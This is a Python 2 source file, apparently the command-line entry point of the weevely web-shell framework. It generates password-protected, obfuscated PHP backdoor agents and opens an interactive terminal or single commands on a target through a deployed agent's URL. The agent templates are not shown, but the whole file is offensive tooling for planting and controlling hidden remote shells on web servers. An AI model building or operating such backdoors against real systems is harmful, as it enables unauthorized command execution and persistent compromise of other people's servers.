#!/usr/bin/env python2
from core.terminal import Terminal
from core.weexceptions import FatalException
from core.loggers import log, dlog
from core.sessions import SessionURL, SessionFile
from core.config import agent_templates_folder_path, obfuscators_templates_folder_path
from core import generate
from core import modules
from core import messages
from core.argparsers import CliParser
import pprint
import glob
import os
import sys

def main(Arguments):

    if Arguments.command == 'generate':

        obfuscated = generate.generate(
            password = Arguments.password,
            obfuscator = Arguments.obfuscator,
            agent = Arguments.agent
        )

        generate.save_generated(obfuscated, Arguments.path)

        log.info(
        messages.generate.generated_backdoor_with_password_s_in_s_size_i %
        (Arguments.path,
        Arguments.password, len(obfuscated))
        )

        return

    elif Arguments.command == 'terminal':
        session = SessionURL(
            url = Arguments.url,
            password = Arguments.password
        )

    elif Arguments.command == 'session':
        session = SessionFile(Arguments.path)

    dlog.debug(
        pprint.pformat(session)
    )

    modules.load_modules(session)

    if not Arguments.cmd:
        Terminal(session).cmdloop()
    else:
        Terminal(session).onecmd(Arguments.cmd)

if __name__ == '__main__':

    parser = CliParser(prog='weevely')
    subparsers = parser.add_subparsers(dest = 'command')

    TerminalParser = subparsers.add_parser('terminal', help='Run terminal or command on the target')
    TerminalParser.add_argument('url', help = 'The agent URL')
    TerminalParser.add_argument('password', help = 'The agent password')
    TerminalParser.add_argument('cmd', help = 'Command', nargs='?')

    SessionParser = subparsers.add_parser('session', help='Recover an existing session')
    SessionParser.add_argument('path', help = 'Session file path')
    SessionParser.add_argument('cmd', help = 'Command', nargs='?')

    agents_available = [
        os.path.split(agent)[1].split('.')[0] for agent in
        glob.glob('%s/*.tpl' % agent_templates_folder_path)
    ]

    obfuscators_available = [
        os.path.split(agent)[1].split('.')[0] for agent in
        glob.glob('%s/*.tpl' % obfuscators_templates_folder_path)
    ]

    GenerateParser = subparsers.add_parser('generate', help='Generate new agent')
    GenerateParser.add_argument('password', help = 'Agent password')
    GenerateParser.add_argument('path', help = 'Agent file path')
    GenerateParser.add_argument(
        '-obfuscator', #The obfuscation method
        choices = obfuscators_available,
        default = 'obfusc1_php'
        )
    GenerateParser.add_argument(
        '-agent', #The agent channel type
        choices = agents_available,
        default = 'obfpost_php'
        )

    parser.set_default_subparser('terminal')

    Arguments = parser.parse_args()

    try:
        main(Arguments)
    except (KeyboardInterrupt, EOFError):
        log.info('Exiting.')
    except FatalException as e:
        log.critical('Exiting: %s' % e)
